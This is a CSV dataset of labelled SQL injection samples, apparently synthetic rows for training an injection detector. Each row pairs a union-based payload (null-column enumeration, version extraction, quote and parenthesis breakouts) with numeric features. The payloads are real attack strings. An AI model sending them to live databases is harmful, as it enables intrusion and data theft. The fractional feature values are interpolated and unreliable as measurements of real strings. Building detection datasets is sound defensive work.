id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000254,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000035,7.100990987560215,51.64363845953042,20.0,3.839456777444091,32.75273460835649,1.6036269321130767,12.46545768929564,4.821819229765213,0.6335609584655781,0.032072538642261644,0.24109096148826065,0.0932755414038996,0.0,0.0,0.35636154046957347,-2.168404344971009e-19,0.8218192297652133,1.0,0.0,0.0,0.0,0.0,0.1781807702347864,2.178180770234787,0.0,0.0,0.1781807702347868,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.8218192297652133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8218192297652133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.643638459530426
SMOTE_000255,attack,union,"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",nearest_attack_euclidean,R000991,0.054521620482041906,84.43490621582193,26.0,4.031105322244117,49.34792497265754,9.0,15.0,11.086981243164386,0.5843357767385967,0.10664714337102363,0.17774523895170607,0.13127184093867367,3.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,4.086981243164385,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000256,attack,union,"-2605%'   )    )     )   union all select 4738,4738#",nearest_attack_euclidean,R000797,0.4176445691271765,53.923412015836675,24.230635193665332,3.7728354520467424,14.0,13.538729612669336,18.0,8.384682403167334,0.2601458271856567,0.24997739395032573,0.33447320638155864,0.15540357248245884,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,1.0,0.0,1.3846824031673344,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000257,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,1.6858739404357614e-07,76.0,33.0,4.439993102099514,42.0,2.9999999999999982,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000258,attack,union,"-3035""  )   union all select 7912,7912,7912#",nearest_attack_euclidean,R001153,0.24373502866889976,44.0,22.624822677382642,4.122408385368538,14.0,16.0,8.0,6.0,0.3181818181818182,0.36363636363636365,0.18181818181818182,0.13636363636363635,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000259,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001125,0.15825029622363104,87.76206379559517,17.0,3.140429370167843,53.33976735765076,1.0,17.66988367882538,15.752412759119034,0.6079696097583933,0.01142391986097857,0.20116952613038955,0.1794369442502386,1.0,0.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.9174709197063446,1.0,0.0,8.83494183941269,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000260,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R001287,0.05411193351822634,74.0,20.112935587732423,3.630502521801299,14.0,40.0,8.0,12.0,0.18918918918918917,0.5405405405405406,0.10810810810810811,0.16216216216216217,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,8.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,union,"-2226%""   )    )    union all select 1018,1018,1018,1018--",nearest_attack_euclidean,R000383,0.32123857644258474,55.881798333239004,21.4236403333522,3.8351364574181024,14.0,18.305438666591204,14.0,9.5763596666478,0.2510262925616962,0.3266361340265158,0.2510262925616962,0.17131128085009187,0.0,1.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,1.0,0.0,2.5763596666478,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000262,attack,union,"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",nearest_attack_euclidean,R000255,0.003277831905269162,69.97906639926718,20.0,3.631414172814119,14.0,27.991626559706873,17.991626559706873,9.995813279853436,0.20006977866910935,0.4,0.2570930152363504,0.14283720609454018,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.997906639926719,0.0,0.0,4.997906639926718,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000263,attack,union,"1 where 2363  =  2363 union all select null,null,null,null,null--",nearest_attack_euclidean,R001275,0.08252852493397485,64.76817437239792,21.0,3.789277035865505,38.81453949791833,9.0,10.0,6.953634874479584,0.5980919682955175,0.1397824834877187,0.1553138705419097,0.10681167767485417,0.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,3.953634874479584,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000264,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000407,0.27659444641275804,51.09848130459402,14.0,3.062663063751569,39.67878504367521,1.0,4.0,6.419696260918804,0.7763131943767578,0.01973900468603504,0.0789560187441403,0.12499178219306672,0.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,5.419696260918804,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000265,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000704,0.8937415371169276,74.60929263568195,27.953536821590234,4.210909750410486,36.31151162818344,13.29778100749851,15.0,10.0,0.48619502235149514,0.17871170123265778,0.20105596584950824,0.13403731056633883,3.0,0.0,0.3907073643180463,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,1.6092926356819537,3.3907073643180468,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000266,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000350,0.018116200142882278,56.14247150689437,17.0,3.3081864410929867,38.113977205515496,1.0,8.0,9.028494301378874,0.6788150921144069,0.017821309983175437,0.14257047986540367,0.160793118037014,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,1.0,0.0,5.028494301378873,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000267,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000161,0.0047717600167721036,83.9669314268481,26.0,3.882029321207858,45.95590856913081,4.011022857717295,25.0,9.0,0.5472982766272745,0.04777457294839216,0.29774055178259806,0.1071865986417353,0.0,1.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000268,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000122,0.25090192172902326,75.9538088091801,25.0,3.821402016348607,41.90761761836021,2.523095595409945,23.52309559540995,8.0,0.5515011201748592,0.03331095120834732,0.30984255553860146,0.10534537307819207,0.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000269,attack,union,"1%' union all select null,null,null,null,null--",nearest_attack_euclidean,R000545,0.03834506399342092,46.71554272047073,16.0,3.3622111436103634,33.772434176376585,1.0,4.0,7.943108544094146,0.7228854882440197,0.02142069770999455,0.08568279083997823,0.1700110232060076,1.0,0.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,1.0,0.0,3.9431085440941467,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000270,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001278,1.1623847228769433,73.18242856696618,16.436485713393235,3.041240236698778,54.0,1.0,5.745942853572939,12.436485713393235,0.7387229164907017,0.013680054009087061,0.07769314832020274,0.16990388118000846,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.4364857133932347,1.0,0.0,9.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.4364857133932349,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R001379,0.45659617280006165,113.57700114983916,28.47693348664522,4.16272858291564,37.0,42.86160091987132,17.0,16.71540022996783,0.32673825145134194,0.37612334946852943,0.1501229803965625,0.14701541868356616,3.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,6.71540022996783,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000272,attack,union,"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",nearest_attack_euclidean,R000946,0.20051440380983263,72.4643698829976,23.642913255331734,3.8325299756174815,40.642913255331734,9.0,15.642913255331734,7.178543372334133,0.5608402157409619,0.12423105108669699,0.21575396272235908,0.09917477044998209,1.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,3.1785433723341328,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,1.2059330466974256,82.8661846415275,25.0,3.7532685626325755,43.2042194993795,2.5422543572314993,27.661965142148,9.4577456427685,0.5218151093539245,0.03146512105624805,0.3322037188268635,0.11451605076296392,0.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,2.9154912855370005,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000274,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000961,0.23826768245355062,58.53814486915342,21.0,3.7948819905065965,14.0,21.230515895322736,14.0,9.307628973830685,0.239520648509296,0.36201938558300156,0.239520648509296,0.1589393173984064,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,3.307628973830684,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000921,0.053819428665628534,65.6710203104054,21.06579593791892,3.6444551393087274,14.0,27.736816248324317,14.0,9.93420406208108,0.2132652050805575,0.42221592242872674,0.2132652050805575,0.1512536674101583,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,4.934204062081079,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000728,0.025323529685025825,71.19361714624486,19.0,3.5206998606224404,51.15489371699589,1.0,11.0,8.038723429248973,0.7185179724700186,0.014048625436203666,0.15453487979824063,0.1128985222955371,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,5.038723429248973,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000277,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000704,0.789626546945256,71.39333003159645,28.39333003159645,4.219444024586887,34.2133399368071,12.831657586890232,15.0,9.348332507899112,0.4809615027813569,0.17792974146678536,0.21025097481197938,0.13085778093987832,3.0,0.0,0.34833250789911196,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,1.0,3.348332507899112,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000278,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000850,0.052138033426869054,72.90524373643026,26.905243736430265,4.145367834298623,24.810487472860526,24.12634168475965,15.936829157620174,8.031585421189913,0.34022201411116665,0.3310170437011992,0.21857233438813867,0.1101886077994954,1.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,2.031585421189912,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000279,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000017,9.905916531048142,83.0,29.0,3.9945533084585856,43.0,2.9999999999999982,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,-2.168404344971009e-19,1.0,1.0,0.3542336874631138,2.0,0.0,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.3542336874631138,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000280,attack,union,"-7544""   )    )    union all select 3808,3808,3808,3808--",nearest_attack_euclidean,R000878,0.007019251268606858,56.952090051534995,21.0,3.8057296488639922,14.0,19.96167204122799,14.0,8.990418010306998,0.24584033039086034,0.35046339585671243,0.24584033039086034,0.15785594336156678,0.0,1.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,2.990418010306998,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000818,0.2372366044105345,87.46975980285696,23.379963046593378,3.6803218877263792,52.89981523296689,9.0,14.379963046593378,11.189981523296689,0.6042648913393134,0.10321394499091086,0.16443219948624727,0.12808896418352847,0.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,7.189981523296689,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000282,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,0.23649697203168318,68.26633969846422,23.0,3.8577493247966066,36.69975477384817,9.0,14.566584924616057,8.0,0.5370315163037943,0.13218733470798974,0.2132812959144473,0.11749985307376867,1.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,3.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000283,attack,union,"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000966,0.24406194993277097,106.5431887184669,27.382724512613244,3.8923007132496483,66.23455097477351,9.0,15.0,16.308637743693378,0.6215861978918503,0.08451180099859723,0.1408530016643287,0.15304899944522377,3.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,8.308637743693378,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000284,attack,union,"1%""   )    )    union all select null#",nearest_attack_euclidean,R000969,0.7698387756996,43.0,16.5616643303824,3.2332843758601,20.246657321529593,1.0,15.753342678470405,6.0,0.4708524958495255,0.023255813953488358,0.36635680647605595,0.13953488372093023,0.0,1.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.4383356696176013,1.0,0.0,0.5616643303823983,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000285,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000470,0.5295810038219494,77.71315936166141,22.0,3.740926727543995,14.0,37.90175829776376,12.57368127667718,13.23771978722047,0.18019736508713316,0.48713663180324657,0.16236838104559792,0.17029762206402238,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.76228021277953,1.0,0.0,7.47543957444094,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000286,attack,union,"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",nearest_attack_euclidean,R000284,0.2882952901317328,68.89923299111743,22.0,3.763403575874164,14.0,26.319386392893946,18.0,10.579846598223487,0.2034593978071609,0.38145495308241184,0.2615906543234926,0.15349499478693465,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,0.0,0.0,4.579846598223487,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
